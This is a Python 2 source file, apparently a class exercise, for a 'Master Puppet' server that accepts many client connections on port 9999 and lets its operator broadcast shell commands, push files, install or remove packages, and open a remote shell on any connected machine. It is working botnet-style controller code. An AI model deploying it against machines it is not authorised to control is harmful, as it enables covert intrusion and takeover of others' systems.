#!/usr/bin/python

from _socket import AF_INET , SOCK_DGRAM ,SOCK_STREAM ,socket , SOL_SOCKET , SO_REUSEADDR , error , gethostbyname ,gethostname
from sys import exit as exitapp
from Queue import Queue
from threading import Thread
from datetime import datetime
from os import system,popen
from time import sleep

NUMBER_THREADS = 2
NUMBER_JOBS = [1, 2]
all_connections = []
all_addresses = []
queue = Queue()

# Create socket
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket(AF_INET,SOCK_STREAM)
    except error as e:
        print "Socket creating error : {}".format(str(e))

    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)


# Bind socket to port and wait for connection from client
def socket_bind():
    try:
        print "Binding socket to port {} ...".format(port)
        s.bind((host, port))
        s.listen(5)
    except error as e:
        print "Socket binfing error : {} \n Retrying...".format(str(e))
        sleep(5)
        socket_bind()


# Accept connections from multuple clients and save to list
def accept_connections():
    for c in all_connections:
        c.close()
    del all_addresses[:]
    del all_connections[:]
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print "\nConnections has been established: " + address[0]
        except:
            print "Error accepting connections"


# Close chat with clients
def exits():
    print 'Master Puppet shutdown'

    if len(all_connections) == 0:
        queue.task_done()
        queue.task_done()
    elif len(all_connections) == 1:
        all_connections[0].send(str.encode('qu'))
        all_connections[0].recv(1024)
        queue.task_done()
    else:
        for conn in all_connections:
            conn.send(str.encode('qu'))
            conn.recv(1024)
            queue.task_done()
    s.close()
    exitapp()



# Display all current connections
def get_list_connections():
    global f
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode('sh'))
            conn.recv(2048)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + ' ' + str(all_addresses[i][0]) + ' ' + str(all_addresses[i][1]) + '\n'
    print '---puppets table---\n' + results
    if f == 1:
        Press_Enter()


# Send commands to all client
def Send_commands():

    while True:
        cmd = raw_input("insert command to puppets //(quit) to exit -->")
        cmd = 'se' + cmd
        if len(cmd) > 2:
            for conn in (all_connections):
                conn.send(str.encode(cmd))
            if cmd[2:] == 'quit':
                print "you choose to Exit "
                break

    if len(all_connections) == 0:
        print "You dont have connection with any client"

    Press_Enter()


# Transfer files to clients
def Transfare_file():
    global g
    g = True
    while g:
        try:
            sourcefile = raw_input("Source File -->")
            destination = raw_input("Destination path -->")

            for i, conn in enumerate(all_connections):
                f = open(sourcefile, 'rb')
                data_file = f.read(1024)
                conn.send(str.encode('tr') + str.encode(destination))
                res = str.decode(conn.recv(32))
                print str(res) + '  from : ' + str(all_addresses[i][0]) + ' ' + str(all_addresses[i][1]) + '\n'
                if res == 'ok':
                    while (data_file):
                        conn.send(data_file)
                        data_file = f.read(2048)

                conn.send(str.encode('done'))
                mes = str.decode(conn.recv(64))
                if mes == "done":
                    print "transfare file is sucsses to {}".format(str(all_addresses[i][0]))
                    f.close()
                    g = False

        except Exception as e:
            print "you dont have a right path".format(str(e))
            key = raw_input("Do you want to transfare again file? y/n ")
            if key.lower() == 'n':
                break
            else:
                continue
        if len(all_connections) == 0:
            print "You dont have connection with any client"
            break
    Press_Enter()


# Select a target
def get_target(target):
    try:
        conn = all_connections[target]
        print "Your now connect to   " + str(all_addresses[target][0])
        return conn
    except:
        print "NOt a valid selection"
        return None


# Connect with remote target client
def remote_shell():
    global f
    f = 0
    get_list_connections()
    target = int(raw_input("Select number of puppt to give shell : "))
    conn = get_target(target)
    conn.send(str.encode('Sh'))
    name_dir = str(conn.recv(2048))
    name_dir = name_dir[1:]

    while True:

        try:
            cmd = raw_input("{}@{}:$".format(str(all_addresses[target][0]), name_dir))
            if cmd.decode("utf-8") == 'quit':
                conn.send(str.encode('quit'))
                break
            elif cmd[:2].decode("utf-8") == 'cd':
                conn.send(str.encode(cmd))
                name_dir = str.decode(conn.recv(1024))
                conn.send('')
                name_dir = name_dir[1:]
            else:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480))
                print client_response
        except Exception as e:
            print "Connection was lost : %s" % str(e)
    Press_Enter()


# installation or removing something to clients
def install_remove_programe(action):

    if action == 'in':
        actiont = "install"
    else:
        actiont = "autoremove"
    pack = raw_input("Plz insert name of pragrame -->")
    actiontype = 'apt-get -y %s %s ' % (actiont, pack)
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(action))
            if str.decode(conn.recv(1024)) == 'ok':
                conn.send(str.encode(actiontype))
                if str.decode(conn.recv(1024)) == 'done':
                    print "successful : {}".format(str(all_addresses[i][0]))
                else:
                    print "fauilre : {}".format(str(all_addresses[i][0]))
            else:
                print 'sorry.. i lost my connection '
        except error as e:
            print "We have trouble:: {}".format(str(e))
    Press_Enter()


# Create work:er threads
def create_workers():
    for _ in range(NUMBER_THREADS):
        t = Thread(target=work)
        t.daemon = True
        t.start()


# Do next job in the queue
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            menu()
        queue.task_done()


# Each list is a new job
def create_jobs():
    for x in NUMBER_JOBS:
        queue.put(x)
    queue.join()


def NotFound():
    print "Option not found!"
    menu()


def Press_Enter():
    global f
    try:
        input("Press Enter to continue..")
    except:
        f = 1
        menu()


# Display menu
def menu():

    system("clear")
    print ('\n'
              '1.Show all clients\n'
              '2.Send commands to all client\n'
              '3.Transfer file toclients\n'
              '4.Install package on all clients\n'
              '5.Remove package from all clients\n'
              '6.shell acsess\n'
              '7.exit')
    cmd = (raw_input('Select option above +++> '))
    op = {
            "1": get_list_connections,
            "2": Send_commands,
            "3": Transfare_file,
            "4": lambda : install_remove_programe('in'),
            "5": lambda : install_remove_programe('re'),
            "6": remote_shell,
            "7": exits
    }
    op.get(cmd, NotFound)()



# Get my Ip
def get_ip_address():
    s = socket(AF_INET, SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    segment = s.getsockname()[0]
    s.close()
    return segment


# GET MY SEGMENT
def Segment():
    hostname = gethostname()
    ip = get_ip_address()
    dns = gethostbyname('google.com')  # os sends out a dns query
    gww = popen("ip route show | grep 'default' | awk '{print $3}' ")
    gw = gww.read()
    current_time = datetime.now().time()

    print ("\n"
           "################################################\n"
           "## PYTHON 102   NAME=GZ.ABED   TIME={}  ##\n"
           "################################################\n"
           " * My IP : {}\n"
           " * MY HOSTNAME : {}\n"
           " * MY DNS : {}\n"
           " * MY GW : {}"
           "###############################################\n"
           "    ").format(unicode(current_time.replace(microsecond=0)), ip, hostname, dns, gw)


def main():
    global f
    f=1
    system("clear")
    Segment()
    create_workers()
    create_jobs()

# Start main
if __name__ == '__main__':
    main()
